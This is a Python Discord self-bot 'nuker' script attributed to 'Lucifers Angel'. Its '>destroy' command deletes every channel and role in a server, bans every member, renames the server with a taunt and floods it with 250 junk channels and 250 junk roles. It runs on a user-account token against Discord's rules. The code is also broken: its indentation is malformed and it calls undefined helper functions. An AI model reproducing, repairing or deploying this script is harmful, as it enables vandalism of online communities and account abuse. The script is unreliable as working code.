token = ""
prefix = ">"


import discord
import itertools
import threading
import time
import sys
import requests
import uuid
import string
import random
from discord.ext import commands


done = False

done = True
bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("-" * 40)
    print ("Made by Lucifers Angel")
    print ("Prefex -", prefix)
    print ("User -", bot.user.name)
    print ("ID - ", bot.user.id)
    print ("Type In >destroy in chat To Nuke")
    print ("-" * 40)

try:
    async def self_check(ctx):
        if bot.user.id == ctx.message.author.id:
            return True
        else:
            return False
        
@commands.check(self_check)
@bot.command(pass_context=True)
    async def destroy (ctx):
        await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="Run",
            reason="Lucifer's Angel Was Here",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())


except:
    pass

bot.run(token, bot=False)
